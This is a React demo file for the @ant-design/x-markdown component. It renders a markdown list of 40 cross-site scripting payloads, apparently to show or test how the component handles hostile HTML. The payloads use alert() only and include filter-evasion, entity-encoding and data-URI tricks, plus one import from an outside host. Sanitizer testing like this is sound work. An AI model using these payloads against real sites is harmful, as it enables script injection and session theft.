import { XMarkdown } from '@ant-design/x-markdown';
import React from 'react';
import { useMarkdownTheme } from '../_utils';
import '@ant-design/x-markdown/themes/light.css';
import '@ant-design/x-markdown/themes/dark.css';

const content = `
### Cross-Site Scripting (XSS) Attack Vectors

#### 1. Stored XSS (Persistent XSS)
<img src=x onerror="alert('Stored XSS - Image onerror payload')">

#### 2. Reflected XSS (Non-persistent XSS)
[Malicious Link](javascript:alert('Reflected XSS - Link click payload'))

#### 3. DOM-based XSS
<iframe srcdoc="<script>alert('DOM-based XSS - iframe srcdoc injection')</script>"></iframe>

#### 4. Attribute-based XSS
<iframe src="javascript:alert('Attribute-based XSS - src attribute injection')"></iframe>

#### 5. Script Tag Injection
<script>alert('Direct script injection XSS vector');</script>

#### 6. Event Handler XSS
<img src="invalid.jpg" alt="Test Image" onerror="alert('Event handler XSS - onerror payload')" />

#### 7. JavaScript Protocol XSS
<a href="javascript:alert('JavaScript protocol XSS')">Click Here</a>

#### 8. SVG Vector XSS
<svg onload="alert('SVG onload event XSS vector')"></svg>

#### 9. Form Input XSS
<form action="javascript:alert('Form action XSS')">
  <input type="text" value="<script>alert('Input field XSS')</script>">
</form>

#### 10. CSS Injection XSS
<div style="background-image: url(javascript:alert('CSS background image XSS'))">Test Content</div>

#### 11. Data URI XSS
<img src="data:text/html,<script>alert('Data URI XSS vector')</script>">

#### 12. HTML Entity Encoding Bypass
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#72;&#84;&#77;&#76;&#32;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#101;&#110;&#99;&#111;&#100;&#105;&#110;&#103;&#32;&#98;&#121;&#112;&#97;&#115;&#115;&#39;&#41;">

#### 13. Filter Evasion XSS
<scr<script>ipt>alert('Filter evasion XSS - nested script tags')</scr</script>ipt>

#### 14. Mouse Event XSS
<div onmouseover="alert('Mouse event XSS - onmouseover payload')">Hover over this text</div>

#### 15. Focus Event XSS
<input onfocus="alert('Focus event XSS - onfocus payload')" value="Click here">

#### 16. Frame Injection XSS
<iframe src="data:text/html,<body onload=alert('Frame injection XSS')>"></iframe>

#### 17. Object Tag XSS
<object data="data:text/html,<script>alert('Object tag XSS vector')</script>"></object>

#### 18. Embed Tag XSS
<embed src="data:text/html,<script>alert('Embed tag XSS vector')</script>">

#### 19. URL Parameter XSS
<a href="http://example.com/search?q=<script>alert('URL parameter XSS')</script>">Malicious Search Link</a>

#### 20. MathML XSS Vector
<math><mi//xlink:href="data:x,<script>alert('MathML XSS vector')</script>">X</mi></math>

#### 21. Stylesheet XSS
<link rel="stylesheet" href="javascript:alert('Stylesheet XSS vector')">

#### 22. Meta Refresh XSS
<meta http-equiv="refresh" content="0;url=javascript:alert('Meta refresh redirect XSS')">

#### 23. Base Tag XSS
<base href="javascript:alert('Base tag XSS vector')//">

#### 24. Image Map XSS
<img src="test.jpg" usemap="#test">
<map name="test">
  <area shape="rect" coords="0,0,100,100" href="javascript:alert('Image map XSS vector')">
</map>

#### 25. Media Tag XSS
<audio src="x" onerror="alert('Audio tag XSS vector')"></audio>
<video src="x" onerror="alert('Video tag XSS vector')"></video>

#### 26. Details Tag XSS
<details open ontoggle="alert('Details tag XSS vector')">Click to expand details</details>

#### 27. Progress Bar XSS
<progress value="50" max="100" onmouseover="alert('Progress bar XSS vector')">50%</progress>

#### 28. Select List XSS
<select onfocus="alert('Select list XSS vector')">
  <option>Option 1</option>
  <option>Option 2</option>
</select>

#### 29. Text Area XSS
<textarea onfocus="alert('Text area XSS vector')">Click here</textarea>

#### 30. Button Tag XSS
<button onclick="alert('Button click XSS vector')">Click Button</button>

#### 31. Marquee Tag XSS (Deprecated but still functional)
<marquee onstart="alert('Marquee tag XSS vector')">Scrolling text</marquee>

#### 32. Keygen Tag XSS (Deprecated)
<keygen onfocus="alert('Keygen tag XSS vector')">

#### 33. Table Background XSS
<table background="javascript:alert('Table background XSS')">
  <tr><td>Table cell</td></tr>
</table>

#### 34. Input Type XSS
<input type="image" src="javascript:alert('Input image XSS')">

#### 35. Body Tag XSS
<body onload="alert('Body onload XSS vector')">Page content</body>

#### 36. Div Background XSS
<div style="background:url(javascript:alert('Div background XSS'))">Content</div>

#### 37. Table Cell XSS
<td background="javascript:alert('Table cell XSS')">Cell content</td>

#### 38. XML Namespace XSS
<html xmlns:xss>
<?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
<xss:xss>XML namespace XSS</xss:xss>
</html>

#### 39. VBScript XSS (IE specific)
<script language="VBScript">alert("VBScript XSS vector")</script>

#### 40. Expression XSS (IE specific)
<div style="width: expression(alert('IE expression XSS'))">IE specific XSS</div>
`;

const App = () => {
  const [className] = useMarkdownTheme();
  return <XMarkdown className={className} content={content} />;
};

export default App;
